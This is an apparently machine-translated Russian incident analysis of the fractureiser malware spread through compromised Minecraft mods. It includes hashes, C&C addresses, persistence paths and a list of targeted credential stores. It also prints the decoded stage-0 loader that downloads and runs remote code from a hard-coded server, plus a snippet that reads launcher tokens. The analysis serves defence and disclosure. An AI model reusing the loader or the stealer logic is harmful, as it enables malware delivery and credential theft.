# Техническая информация

## Распространение

Для некоторых пакетов модов были опубликованы обновления без ведома авторов, что добавило зависимость от вредоносных модов. Эти обновления пакетов модов были заархивированы сразу после загрузки, то есть они *не отображаются в веб-интерфейсе, а только через API.*

Вредоносные моды имеют даты загрузки на несколько недель раньше. Большинство из них были
загружены одноразовыми учетными записями с явно сгенерированными автоматически именами и, вероятно, были начальными
инфекции. Luna Pixel Studios была скомпрометирована из-за того, что разработчик тестировал один из этих модов, так как это была интересная новая загрузка.

### Известные затронутые моды и плагины

Примечание. Этот список **неполный**. Он был построен в первые дни
расследование, и мы быстро поняли, что масштабы этого были намного шире, чем мы думали,
делая отслеживание отдельных случаев бессмысленным. Он оставлен здесь для исторических целей.

Посмотрите также на CurseForge
[список](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/)
затронутых проетков.

|мод/плагин|ссылки(-а)|SHA1|"Распространитель"|
|---|---|---|---|
|Skyblock Core|[www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565) |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
|Dungeonz|[legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (removed)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100) |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
|Haven Elytra|[dev.bukkit.org/projects/havenelytra/files/4551105 (removed)](https://dev.bukkit.org/projects/havenelytra/files/4551105)   [legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105 (removed)](https://legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105) |`284A4449E58868036B2BAFDFB5A210FD0480EF4A`|fractureiser|
|Vault Integrations|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simpleharvesting82|
|AutoBroadcast|[www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257 (removed)](https://www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257)|`C55C3E9D6A4355F36B0710AB189D5131A290DF26`|shyandlostboy81|
|Museum Curator Advanced|[www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353 (removed)](https://www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353)|`32536577D5BB074ABD493AD98DC12CCC86F30172`|racefd16|
|Vault Integrations Bug fix|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simplyharvesting82
|Floating Damage|[dev.bukkit.org/projects/floating-damage (removed)](https://dev.bukkit.org/projects/floating-damage)|`1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc`|mamavergas3001
|Display Entity Editor|[www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122 (removed)](https://www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122)|`A4B6385D1140C111549D95EAB25CB51922EEFBA2`|santa_faust_2120

Darkhax отправид это: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f

потенциально больше: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib

## Стадия 0 (Зараженные jar-файлы с модами)

Затронутые моды или плагины имеют новый метод `static void`, вставленный в их основной класс, и вызов этого метода вставлен в статический инициализатор этого класса. Для DungeonZ этот метод называется _d1385bd3c36f464882460aa4f0484c53 и находится в net.dungeonz.DungeonzMain. Для ядра Skyblock метод называется _f7dba6a3a72049a78a308a774a847180 и вставляется в com.bmc.coremod.BMCSkyblockCore. Для HavenElytra код вставляется непосредственно в неиспользуемый статический инициализатор valorless.havenelytra.HavenElytra.

Код метода обфусцирован (зашифрован), используя `new String(new byte[]{...})` вместо строковых литералов.

Из образца D3SL «Create Infernal Expansion Plus», подражательной версии «Create Infernal Expansion Compat» с вредоносным ПО, вставленным в основной класс мода:
```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // "Utility"
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```

Это:
1. Создаёт `URLClassLoader` с URL'ом `http://[85.217.144.130:8080]/dl` ([shodan](https://www.shodan.io/host/85.217.144.130))
2. Загружает класс `Utility` из classloader'а, получает код из интернета
3. Вызывает метод `run` на `Utility`, передача строкового аргумента, разного для каждого зараженного мода (!). Например:
    * Skyblock Core: "`-74.-10.78.-106.12`"
    * Dungeonz: "`-114.-18.38.108.-100`"
    * HavenElytra: "`-114.-18.38.108.-100`"
    * Vault Integrations: "`-114.-18.38.108.-100`"

Передаваемые числа анализируются как байты на этапе 1 и записываются в файл с именем «.ref». Судя по всему, они позволяют автору отслеживать источники заражения.

Создание загрузчика классов жестко привязано к этому URL-адресу и не использует URL-адрес Cloudflare, который используется на этапе 1. Поскольку этот IP-адрес сейчас отключен, это означает, что полезная нагрузка Этапа 0, о которой мы сейчас знаем, больше не работает.

## Стадия 1 (`dl.jar`)

SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`

[Декомпилированные файлы вредоносного ПО можно найти здесь](../../../decomp).

Самое первое, что делает `Utility.run`, это проверяет, установлено ли системное свойство `neko.run`. Если это так, он *немедленно прекратит выполнение*. Если нет, он устанавливает его в пустую строку и продолжает. Похоже, что это вредоносное ПО пытается избежать многократного запуска, например, если оно заразило несколько модов. * На него нельзя полагаться как на аварийный выключатель, поскольку Stage1 загружается из Интернета и может измениться.*

Он пытается связаться с 85.217.144.130 и доменом Cloudflare Pages (https://files-8ie.pages.dev/ip). Отчеты о нарушениях уже отправлены. Домен Pages используется для получения IP-адреса C&C-сервера, если первый IP-адрес больше не отвечает — URL-адрес отвечает двоичным представлением адреса IPv4.

* IP-адрес C&C был обнулен после сообщения о злоупотреблении поставщику сервера. Нам нужно будет следить за страницей Cloudflare, чтобы увидеть, установлен ли новый сервер C&C, я не могу представить, что они не планировали этого. * Спасибо, Serverion, за ваш быстрый ответ.

* Домен Cloudflare Pages был закрыт. * Новый C&C-сервер расположен по адресу `107.189.3.101`.

Затем на этапе 1 предпринимается попытка добиться постоянства, выполнив следующие действия:
1. Загрузка Этапа 2 (lib.jar в Linux, libWebGL64.jar в Windows) с сервера
2. Автоматический запуск этапа 2 при запуске:
* В Linux он пытается разместить файлы юнитов systemd в `/etc/systemd/system` или `~/.config/systemd/user`
    * Файл юнитов, который он помещает в папку пользователя, никогда не работает, потому что он пытается использовать `multi-user.target`, которого не существует для пользовательских юнитов
* В Windows пытается изменить реестр
  (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`), чтобы запустить себя, или
  в противном случае пытается добавить себя в папку «Windows\Start Menu\Programs\Startup»

## Стадия 2 (`lib.jar` или `libWebGL64.jar`)

Известные хэши sha1:
* `52d08736543a240b0cbbbf2da03691ae525bb119`
* `6ec85c8112c25abe4a71998eb32480d266408863` (Предыдущая загрузка D3SL)

Стадия 2 запутана демо-версией обфускатора Allatori, а его основной класс называется Bootstrap.
Кроме того, он содержит еще один класс с именем `h`, который кажется простым коммуникационным классом, но пуст.
в противном случае. Вы можете просмотреть попытку восстановить исходный код на
https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe

При запуске делает следующее:
1. Откройте порт `9655` и добавьте перехватчик выключения, чтобы закрыть его при закрытии jvm.
2. Находить себя на диске и работать рядом с собой
3. Если `.ref` существует, он считывает ключ идентификатора из файла.
4. Запускает цикл для
    1. Проверяет с помощью `https://[files-8ie.pages.dev]:8083/ip` сервер и пытается подключиться к нему.
    2. Получает флаг, если проверка обновлений должна продолжаться, если нет, выдает (сообщается серверу через порт `1338`)
    3. Если это так, получает хеш и проверяет его на соответствие `client.jar`, если он существует, и отправляет обратно байт, если он хочет обновить
    4. Если да, то получает и перезаписывает/создает `client.jar`, скрывая его с помощью атрибутов файла
    5. Загружает и вызывает статический метод `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)`
    6. Спит 5 секунд

## Стадия 3 (`client.jar`)

sha-1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
sha-1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`

`client.jar` — невероятно запутанный и сложный пакет кода, содержащий как Java, так и нативный код.

Он содержит встроенную полезную нагрузку `hook.dll`, декомпилированную: https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c

Есть две встроенные функции, предназначенные для вызова из Java, поскольку они могут вызываться JNI:
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`

Судя по анализу, они делают то, что говорят на банке:
* Чтение содержимого буфера обмена
* Украсть учетные данные Microsoft

Также есть свидетельства того, что код пытается сделать следующее:
* Сканировать *все* jar-файлы в системе, которые выглядят как моды Minecraft (путем обнаружения
  Forge/Fabric/Quilt/Bukkit) или [объявить основной
  класс](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)
  (большинство простых Java-программ) и попытаться внедрить в них стадию 0.
* Украсть файлы cookie и данные для входа во многие веб-браузеры
* Замените криптовалютные адреса в буфере обмена на альтернативные, которые предположительно принадлежат злоумышленнику.
* Украсть учетные данные Discord
* Украсть учетные данные Microsoft и Minecraft из различных программ запуска
* Украсть криптокошельки

Jar-файлы эвристически обнаруживаются как моды или плагины Minecraft следующим образом:
* Forge (`dev/neko/e/e/e/A`): Вредоносное ПО пытается найти аннотацию @Mod, которая требуется в каждом моде.
* Bukkit (`dev/neko/e/e/e/C`): Вредоносная программа проверяет, расширяет (extends) ли класс Bukkit, класс `JavaPlugin`
* Fabric/Quilt (`dev/neko/e/e/e/i`): Вредоносная программа проверяет, реализует ли класс `ModInitializer`
* Bungee (`dev/neko/e/e/e/l`): Вредоносная программа проверяет, не расширяет ли класс Bungee класс `Plugin`
* Vanilla (`dev/neko/e/e/e/c`): Вредоносная программа проверяет, не является ли основной клиентский класс `net.minecraft.client.main.Main`

## Стадия3 (`unobf-client.jar`)

Примерно 07.06.2023, 14:20 UTC клиентский Jar-файл stage3, по-видимому, была случайно заменена на необфусцированную (не зашифрованную) версию. Вы можете найти архив здесь: https://github.com/clrxbl/NekoClient

This validates the suspected behavior/evidence from the analysis done on the prior obfuscated `client.jar` sample.

### Репликация

Репликация осуществляется посредством автоматической обработки классов в файлах jar по всей файловой системе на локальном компьютере. Любой jar-файл, содержащий классы, отвечающие определенным критериям, может быть заражен. Процесс сканирования локальной файловой системы и внедрения вредоносного кода можно найти здесь: [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L273)

Критерии, которые ищет процесс, можно найти здесь: [`dev/neko/nekoinjector/template/impl`](https://github.com/clrxbl/NekoClient/tree/main/dev/neko/nekoinjector/template/impl)

* `BungeecordPluginTemplate` ищет интерфейс `net/md_5/bungee/api/plugin/Plugin` в классах
* `FabricModTemplate` ищет интерфейс `net/fabricmc/api/ModInitializer` в классах
* `ForgeModTemplate` ищет аннотацию `net/minecraftforge/fml/common/Mod` в классах
* `MinecraftClientTemplate` ищет наличие `net/minecraft/client/main/Main.class` и `net/minecraft/client/gui/GuiMultiplayer.class` в банке.
* `SpigotPluginTemplate` ищет супертип `org/bukkit/plugin/java/JavaPlugin` в классах
* Если ни один из вышеперечисленных не соответствует классу, [он попытается заразить основной класс jar-файла](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244) - если есть.

Внедренный вредоносный код представляет собой логику бэкдора, наблюдаемую в Стадии 0. Инъекция работает следующим образом: вредоносный код объявляется в классе Loader в статическом методе. Смежный с ним класс Injector отвечает за извлечение кода из Loader и вставку его в новые классы, предназначенные для заражения. Возвращаемое значение `Injector.loadInstallerNode(...)` представляет собой `MethodNode`, описывающий сам процесс заражения. Теперь им просто нужно добавить этот метод в целевой класс. Вернитесь в [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272) они вызывают Entry.inject(MethodNode) для достижения этой цели. Чтобы гарантировать вызов вредоносного метода, этот метод «внедрить» добавляет логику к статическому инициализатору целевого класса, который вызывает добавленный метод. Поскольку статический инициализатор запускается при первой загрузке класса, а целевой класс является плагином/модом, предполагается, что этот код всегда будет запускаться пользователями, которые запускают зараженные пакеты модов или серверы. После этого они переупаковывают банку с новым зараженным целевым классом.

### Трюки против песочницы

Что-то, что обычно не встречается в вредоносных программах JVM, представлено здесь — это класс под названием `VMEscape`. Он проверяет, находится ли он в [Windows Sandbox](https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview). Текущий пользователь — «WDAGUtilityAccount». Если это условие выполнено, делается попытка выхода из песочницы Windows.

Процесс примерно такой:

- Запустите повторяющийся поток для выполнения следующих действий:
  - Создайте временный каталог, используя `Files.createTempDirectory(...)`
  - Перебирать записи `FileDescriptor` в системном буфере обмена, которые отражают буфер обмена хостов.
  - Создайте ярлык, который выглядит как исходный файл _(с использованием значков из SHELL32)_, но вместо этого вызывает вредоносное ПО.
  - Записывает этот ярлык в буфер обмена, перезаписывая исходную ссылку на файл.

### Кража данных

**MSA Токены**: Поскольку этот мод предназначен для модов Minecraft, вполне естественно попытаться украсть токен MSA, используемый для входа в Minecraft. Некоторые лаунчеры хранят эти данные в локальном файле, из которого эта вредоносная программа попытается прочитать. Это влияет на различные пусковые установки, такие как:

* Ванильный/моджанговский лаунчер
* Устаревший лаунчер vanilla/mojang
* PolyMC / Prism
* Technic
* Feather
* LabyMod (< v3.9.59)
* И любой токен MSA, найденный в [Диспетчере учетных данных Windows](https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0)

Логика поиска (см. [`dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java)) выглядит одинаково для ряда элементов, поскольку они хранят эти данные аналогичным образом. Например, вот код laby-mod:
```java
private static void retrieveRefreshTokensFromLabyMod(List<RefreshToken> refreshTokens) throws IOException {
	String appdata = System.getenv("APPDATA");
	if (Platform.isWindows() || Objects.isNull(appdata)) {
		Path path = appdata == null ? null : Paths.get(appdata, ".minecraft", "LabyMod", "accounts.json");
		if (Files.isReadable(path)) {
			extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(Files.readString(path)).asObject());
		}
	}
}
```
Код для получения токенов из Feather/PolyMC/Prism практически идентичен.

Отличие этой стратегии от ванильных лаунчеров заключается в том, что Json имеет дополнительный уровень криптографии, защищающий его.

Изменение от этой стратегии к технике заключается в том, что техника хранит учетные данные, используя встроенную в Java сериализацию объектов, обертывая тип `com.google.api.client.auth.oauth2.StoredCredential`.

**Discord токены**: Все видели токенворовщиков раньше. Похищает токен и дополнительную информацию, такую ​​как способы оплаты, связанный номер телефона и т. д. Влияет на стандартный клиент, клиенты canary, ptb и lightcord. Соответствующий источник: [`dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java`](https://github.com/clrxbl/NekoClient/blob/fd76c5f9d40d1e10de11f00a6b4e0cca3d6221a3/dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java)

**Файлы cookie и сохраненные учетные данные**: Похищает сохраненные файлы cookie и учетные данные для входа, сохраненные в уязвимых браузерах. Соответствующий источник: [`dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java)

- Mozilla Firefox
  - Waterfox
  - Pale Moon
  - SeaMonkey
- Chrome
  - Edge
  - Brave
  - Vivaldi
  - Yandex
  - Slimjet
  - CentBrowser
  - Comodo
  - Iridium
  - UCBrowser
  - Opera
    - Beta
    - Developer
    - Stable
    - GX
    - Crypto
  - CryptoTab

## Стадия 3b (`dummyloader3.jar`)

Стадия 3 была заменена на другой jar-файл через некоторое время после того, как был создан второй C&C-сервер.

Похоже, что это просто программа обновления SkyRage, которая является другой вредоносной программой для minecraft, нацеленной на blackspigot.

### Настойчивость
- Windows: планировщик задач `MicrosoftEdgeUpdateTaskMachineVM`, файл `%AppData%\..\LocalLow\Microsoft\Internet Explorer\DOMStore\microsoft-vm-core`.
- Linux: `/bin/vmd-gnu`, `/etc/systemd/system/vmd-gnu.service`, сервис `vmd-gnu`.

### Подключения
- C&C сервер: `connect.skyrage.de`
- Загружает: `hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/qqqqqqqqqqqqqqqqqqqq`.

### Действия
- `qqqqqqqqqqqqqqqqqqqq` jar-файл извлекает всевозможную информацию (cookies браузера, discord, minecraft, epic games, steam login, также кое-что о криптокошельках и парольных памангерах), которую обновленный jar загружает на C&C сервер
- заменяет адреса криптомонет в буфере обмена на адреса, полученные от `95.214.27.172:18734`
- персистентность (см. выше)
- содержит автоапдейтер, текущая версия - 932 (`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/version`)

### Сопоставления

Это отображения для данного образца, которые могут быть применены через Enigma или другой инструмент, поддерживающий отображения Engima.
```
CLASS D Chat
CLASS E ChatChain
CLASS E$a ChatChain$ChainLink
CLASS F ClientChat
CLASS G EncryptionRequest
CLASS H EncryptionResponse
CLASS H$a EncryptionResponse$EncryptionData
CLASS J KeepAlive
CLASS L LoginPayloadResponse
CLASS O PluginMessage
CLASS O$1 BungeeCordProtocolVersionMapFunction
CLASS P SetCompression
CLASS R StatusResponse
CLASS T CryptocurrencyClipboardLogger
CLASS T$1 CryptocurrencyClipboardLogger$LowLevelKeyboardHook
CLASS U AutoRunPersistence
CLASS V InputStreamFileWriter
CLASS W OperatingSystem
CLASS X AutoUpdater
CLASS Y StacktraceSerializer
CLASS a MalwareClientConnectionHandler
CLASS b Main
    FIELD a intconst I
    FIELD a string0 Ljava/lang/String;
    FIELD a ipAddress Ljava/net/InetSocketAddress;
CLASS g MinecraftBot
CLASS h MinecraftBot2
CLASS o MinecraftFriendlyByteBuf
CLASS s MinecraftIPAddressResolver
CLASS t MinecraftPacketDecoder
CLASS y MinecraftPacketEncryption
```

### Анти-декомпиляция

Этот пример, по-видимому, использует технические особенности в class-файле для сбоя инструментов декомпиляции. Такие эксплойты могут быть исправлены с помощью [CAFED00D](https://github.com/Col-E/CAFED00D), парсера байткода, который отфильтровывает неправильно сформированные атрибуты. После этого единственной оставшейся проблемой является базовая обфускация, применяемая демо-версией Allatori.

# Другие вещи

Более подробную информацию можно найти в документах по отмене этапа 3: https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ.

Когда был запущен второй C&C сервер, деобфусцированная версия stage 3 была
случайно передавалась в течение примерно 40 минут.

Основной сервер полезной нагрузки *был* (был удален) размещен на Serverion, компании, базирующейся в Нидерландах.

Новый C&C также был удален. _2023-06-07 18:51 UTC_

Кроме HTTP-сервера на порту 80/443 и SSH-сервера на порту 22, на `85.217.144.130` и `107.189.3.101` были открыты следующие порты:

* 1337
* 1338 (порт, указанный в файле Stage 1 для создания нового соединения с отладчиком)
* 8081 (это WebSocket-сервер - никаких видимых функций сейчас не выполняет, не упоминается в каком-либо вредоносном коде)
* 8082 (никто ничего не получил от этого, не упоминается в каком-либо вредоносном коде)
* 8083 (с ним связались на этапе 1)

Любопытно, что на странице bukkit в fractureiser написано "Last active Sat, Jan, 1 2000 00:00:00" https://dev.bukkit.org/members/fractureiser/projects/.

## Образцы

Пожалуйста, спрашивайте в IRC-чате о доступе к образцам для чтения или чтения/записи. Исходный код декомпилированного клиента Stage 3 доступен: https://github.com/clrxbl/NekoClient.

## Последующие действия
Хотя пока рановато говорить о долгосрочных последующих действиях, весь этот дебош выявил несколько критических недостатков в экосистеме Minecraft с модами. Этот раздел - просто мозговой штурм по ним и по тому, как мы можем их улучшить.

#### 1. Рецензирование в репозиториях модов неадекватно

Что именно CurseForge и Modrinth делают при "рецензировании" мода? Мы должны знать об этом как сообщество, вместо того, чтобы полагаться на безопасность через неизвестность.
Должны ли мы проводить какой-то статический анализ? (у williewillus есть несколько идей здесь).

#### 2. Отсутствие подписи кода для модов

В отличие от индустрии программного обеспечения в целом, моды, выпущенные и загруженные в репозитории, обычно не подписываются ключом подписи, который доказывает, что владелец ключа загрузил мод. Наличие подписи и отдельного механизма распространения/доверия ключей позволяет снизить вероятность взлома аккаунтов CurseForge.

Однако это приводит к более серьезному вопросу о том, как получить доверие к ключу, поскольку факт, что "этот jar имеет эту подпись" должен быть передан из CurseForge/Modrinth вне диапазона, стандартным способом, чтобы загрузчики или пользователи могли проверить подписи.
Forge пытался внедрить подпись много лет назад, и это имело ограниченное распространение.

#### 3. Отсутствие воспроизводимых сборок

Инструментальные цепочки Minecraft беспорядочны, и сборки обычно не воспроизводятся. Часто бывает так, что скрипты сборки получают неприкрепленные -SNAPSHOT версии случайных плагинов Gradle и используют их, что приводит к артефактам, которые не воспроизводятся и, следовательно, не поддаются аудиту.

Не исключено, что случайный плагин Gradle в будущем станет вектором атаки.

#### 4. Отсутствие песочницы в самом Minecraft

Моддинг Java edition всегда обладал всей мощью Java, и это другая сторона обоюдоострого меча: вредоносный код имеет далеко идущие последствия.
Сам Minecraft не запускается с какой-либо песочницей, и серверы обычно не подвергаются песочнице, если только владелец не обладает достаточными знаниями для этого.

Хорошая песочница сложна, особенно в таких системах, как Linux, где SELinux/AppArmor имеют настолько плохой UX, что никто их не применяет.
